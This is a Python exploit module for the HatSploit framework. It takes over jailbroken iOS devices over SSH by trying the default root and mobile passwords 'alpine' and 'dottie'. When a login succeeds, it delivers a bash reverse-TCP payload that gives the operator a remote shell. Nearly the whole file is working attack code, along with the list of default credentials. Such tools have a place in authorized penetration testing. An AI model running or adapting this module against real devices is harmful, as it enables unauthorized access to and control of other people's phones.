#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module
from hatsploit.utils.ssh import SSHClient
from hatsploit.utils.handler import Handler


class HatSploitModule(Module, SSHClient, Handler):
    details = {
        'Category': "exploit",
        'Name': "iOS SSH Cydia.app Default Password",
        'Module': "exploit/apple_ios/ssh/cydia_default_password",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer'
        ],
        'Description': "Bypass iOS SSH authorization using Cydia.app default SSH password.",
        'Targets': {
            'Apple iOS': {
                'Accounts': [
                    ['root', 'dottie'],
                    ['root', 'alpine'],
                    ['mobile', 'dottie'],
                    ['mobile', 'alpine']
                ]
            }
        },
        'Platform': "apple_ios",
        'Rank': "medium"
    }

    payload = {
        'Value': "unix/generic/bash_reverse_tcp",
        'Categories': None,
        'Architectures': [
            'armle',
            'aarch64',
            'generic'
        ],
        'Platforms': [
            'apple_ios',
            'unix'
        ],
        'Types': None
    }

    options = {
        'HOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        },
        'PORT': {
            'Description': "Remote port.",
            'Value': 22,
            'Type': "port",
            'Required': True
        }
    }

    def run(self):
        remote_host, remote_port = self.parse_options(self.options)

        target = self.details['Targets']['Apple iOS']
        self.print_process(f"Exploiting {remote_host}...")

        for account in target['Accounts']:
            self.print_process(f"Attempt to login as {account[0]}:{account[1]}...")

            client = self.open_ssh(
                remote_host,
                remote_port,
                account[0],
                account[1]
            )

            if not client.connect():
                self.print_error("Login attempt failed!")
            else:
                self.print_success(f"Logged in with {account[0]}:{account[1]}")

                self.module_handle(
                    host=remote_host,
                    ensure=True,
                    sender=client.send_command
                )

                client.disconnect()
                break